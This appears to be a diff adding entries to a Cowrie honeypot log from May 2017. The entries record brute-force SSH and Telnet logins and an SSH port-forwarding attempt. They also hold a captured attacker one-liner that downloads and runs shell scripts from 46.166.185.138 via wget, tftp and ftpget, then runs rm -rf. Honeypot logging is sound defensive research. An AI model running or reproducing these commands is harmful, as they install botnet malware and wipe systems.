@@ -3724,3 +3724,81 @@
 2017-05-12T20:35:01+0000 [HoneyPotSSHTransport,91363,130.206.99.99] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
 2017-05-12T20:35:01+0000 [HoneyPotSSHTransport,91363,130.206.99.99] outgoing: 'aes128-cbc' 'hmac-sha1' 'none'
 2017-05-12T20:35:01+0000 [HoneyPotSSHTransport,91363,130.206.99.99] incoming: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-12T20:35:02+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:03+0000 [HoneyPotSSHTransport,91363,130.206.99.99] connection lost
+2017-05-12T20:35:03+0000 [HoneyPotSSHTransport,91363,130.206.99.99] Connection lost after 5 seconds
+2017-05-12T20:35:04+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 46.166.185.242:44320 (10.8.41.81:2223) [session: TT59305]
+2017-05-12T20:35:04+0000 [CowrieTelnetTransport,59305,46.166.185.242] login attempt: 8
+2017-05-12T20:35:04+0000 [CowrieTelnetTransport,59305,46.166.185.242] login return, expect: [root/jauntech]
+2017-05-12T20:35:05+0000 [CowrieTelnetTransport,59305,46.166.185.242] login attempt [root/jauntech] succeeded
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Opening TTY Log: log/tty/20170512-203507-None-59305i.log
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Warning: state changed and new state returned
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] CMD: sh
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Command found: sh 
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] CMD: shell
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Command not found: shell
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.166.185.138/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 46.166.185.138 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 46.166.185.138; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.166.185.138 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Command found: cd /tmp
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Command found: cd /var/run
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Command found: cd /mnt
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Command found: cd /root
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Command found: cd /
+2017-05-12T20:35:07+0000 [CowrieTelnetTransport,59305,46.166.185.242] Command found: wget http://46.166.185.138/bins.sh
+2017-05-12T20:35:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://46.166.185.138/bins.sh>
+2017-05-12T20:35:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Not storing duplicate content 6a7845571aa662548ca1b172b0e8b98e1ddfeaa05dfb61d5a39ed273c8a10803
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Downloaded URL (http://46.166.185.138/bins.sh) with SHA-256 6a7845571aa662548ca1b172b0e8b98e1ddfeaa05dfb61d5a39ed273c8a10803 to dl/6a7845571aa662548ca1b172b0e8b98e1ddfeaa05dfb61d5a39ed273c8a10803
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 /bins.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: sh /bins.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: tftp 46.166.185.138 -c get tftp1.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 46.166.185.138
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 46.166.185.138 ftp1.sh ftp1.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://46.166.185.138/ftp1.sh) with SHA-256 8a5d791f1dd7387333cfedcd817db8384db362b6b3fe1a325e6899b0ebe7079c to dl/8a5d791f1dd7387333cfedcd817db8384db362b6b3fe1a325e6899b0ebe7079c
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: sh /ftp1.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: rm -rf /bins.sh tftp1.sh tftp2.sh /ftp1.sh
+2017-05-12T20:35:07+0000 [HTTPPageDownloader,client] Command found: rm -rf /lost+found /vmlinuz /srv /sys /run /sbin /proc /mnt /bin /usr /tmp /var /initrd.img /etc /opt /boot /selinux /home /media /lib /root /dev
+2017-05-12T20:35:07+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://46.166.185.138/bins.sh>
+2017-05-12T20:35:12+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:17+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:19+0000 [CowrieTelnetTransport,59305,46.166.185.242] Not storing duplicate content 8a5d791f1dd7387333cfedcd817db8384db362b6b3fe1a325e6899b0ebe7079c
+2017-05-12T20:35:19+0000 [CowrieTelnetTransport,59305,46.166.185.242] Saved redir contents with SHA-256 8a5d791f1dd7387333cfedcd817db8384db362b6b3fe1a325e6899b0ebe7079c to dl/8a5d791f1dd7387333cfedcd817db8384db362b6b3fe1a325e6899b0ebe7079c
+2017-05-12T20:35:19+0000 [CowrieTelnetTransport,59305,46.166.185.242] Not storing duplicate content 6a7845571aa662548ca1b172b0e8b98e1ddfeaa05dfb61d5a39ed273c8a10803
+2017-05-12T20:35:19+0000 [CowrieTelnetTransport,59305,46.166.185.242] Saved redir contents with SHA-256 6a7845571aa662548ca1b172b0e8b98e1ddfeaa05dfb61d5a39ed273c8a10803 to dl/6a7845571aa662548ca1b172b0e8b98e1ddfeaa05dfb61d5a39ed273c8a10803
+2017-05-12T20:35:19+0000 [CowrieTelnetTransport,59305,46.166.185.242] Closing TTY Log: log/tty/20170512-203507-None-59305i.log after 12 seconds
+2017-05-12T20:35:19+0000 [CowrieTelnetTransport,59305,46.166.185.242] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-05-12T20:35:19+0000 [CowrieTelnetTransport,59305,46.166.185.242] Connection lost after 15 seconds
+2017-05-12T20:35:22+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:27+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:32+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91085,91.195.103.202] got channel 'direct-tcpip' request
+2017-05-12T20:35:32+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91085,91.195.103.202] direct-tcp connection request to 23.5.96.14:443 from localhost:5556
+2017-05-12T20:35:32+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:32+0000 [SSHChannel None (110) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91085,91.195.103.202] direct-tcp forward to 23.5.96.14:443 with data "\x80z\x01\x03\x01\x00Q\x00\x00\x00 \x00\x009\x00\x008\x00\x005\x00\x00\x16\x00\x00\x13\x00\x00\n\x07\x00\xc0\x00\x003\x00\x002\x00\x00/\x00\x00\x07\x05\x00\x80\x03\x00\x80\x00\x00\x05\x00\x00\x04\x01\x00\x80\x00\x00\x15\x00\x00\x12\x00\x00\t\x06\x00@\x00\x00\x14\x00\x00\x11\x00\x00\x08\x00\x00\x06\x04\x00\x80\x00\x00\x03\x02\x00\x80\xab\xc9B\xcck\xc62'\x0f\x14\xc5\xc4|\xb6\xd1\x1e\xcc\x88c.\x9d\xa0\x8b\xc5\xd5\x89\xdev\x02\x9d\xfd)"
+2017-05-12T20:35:32+0000 [SSHChannel None (110) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91085,91.195.103.202] failed to connect: Connection refused
+2017-05-12T20:35:32+0000 [SSHChannel None (110) on SSHService 'ssh-connection' on HoneyPotSSHTransport,91085,91.195.103.202] sending close 110
+2017-05-12T20:35:37+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:42+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:46+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 130.206.99.99:46904 (10.8.41.81:2222) [session: 32a7b051]
+2017-05-12T20:35:47+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:47+0000 [HoneyPotSSHTransport,91364,130.206.99.99] Remote SSH version: SSH-2.0-libssh-0.2
+2017-05-12T20:35:47+0000 [HoneyPotSSHTransport,91364,130.206.99.99] kex alg, key alg: 'diffie-hellman-group1-sha1' 'ssh-rsa'
+2017-05-12T20:35:47+0000 [HoneyPotSSHTransport,91364,130.206.99.99] outgoing: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-12T20:35:47+0000 [HoneyPotSSHTransport,91364,130.206.99.99] incoming: 'aes128-cbc' 'hmac-sha1' 'none'
+2017-05-12T20:35:50+0000 [HoneyPotSSHTransport,91364,130.206.99.99] NEW KEYS
+2017-05-12T20:35:50+0000 [HoneyPotSSHTransport,91364,130.206.99.99] starting service 'ssh-userauth'
+2017-05-12T20:35:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,91364,130.206.99.99] 'zabbix' trying auth 'password'
+2017-05-12T20:35:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,91364,130.206.99.99] login attempt: 13627
+2017-05-12T20:35:51+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,91364,130.206.99.99] login return, expect: [aa/123456]
+2017-05-12T20:35:52+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,91364,130.206.99.99] login attempt [zabbix/12345] failed
+2017-05-12T20:35:52+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
+2017-05-12T20:35:53+0000 [-] 'zabbix' failed auth 'password'
+2017-05-12T20:35:53+0000 [-] unauthorized login: 
+2017-05-12T20:35:53+0000 [HoneyPotSSHTransport,91364,130.206.99.99] Got remote error, code 11
+	reason: Bye Bye
+2017-05-12T20:35:53+0000 [HoneyPotSSHTransport,91364,130.206.99.99] connection lost
+2017-05-12T20:35:53+0000 [HoneyPotSSHTransport,91364,130.206.99.99] Connection lost after 7 seconds
+2017-05-12T20:35:57+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,91313,163.172.122.151] got global keepalive@jcraft.com request
